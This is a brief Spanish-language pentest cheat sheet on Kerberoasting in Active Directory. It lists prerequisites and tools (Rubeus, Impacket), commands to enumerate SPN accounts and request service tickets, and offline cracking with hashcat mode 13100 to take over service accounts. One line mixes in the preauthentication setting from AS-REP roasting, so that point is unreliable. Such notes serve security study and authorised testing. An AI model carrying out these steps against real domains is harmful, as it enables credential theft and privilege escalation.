✅ 1️⃣ Kerberoasting

🎯 Requerimientos:

1. Un usuario con permisos para listar cuentas de AD (ldapsearch, net user /domain).

2. Cuentas de servicio (SPN) configuradas.

3.  Acceso de red al KDC.

4. Herramientas: Rubeus, Impacket-GetUserSPNs, Kerberoast.py.

🔍 Cómo reconocer:

1. Enumerar usuarios con SPN:

    setspn -T domain -Q */*

o:

    impacket-GetUserSPNs -request -dc-ip <DC_IP> DOMAIN/user:pass

* Ver cuentas que **NO** tengan **Do not require Kerberos preauthentication**

⚡ Exploitar:

1. Pedir TGS: GetUserSPNs (Impacket)

2. Crackear hash offline (hashcat -m 13100).

3. Acceso: obtener credenciales de cuenta de servicio, escalar privilegios si la cuenta tiene altos privilegios.
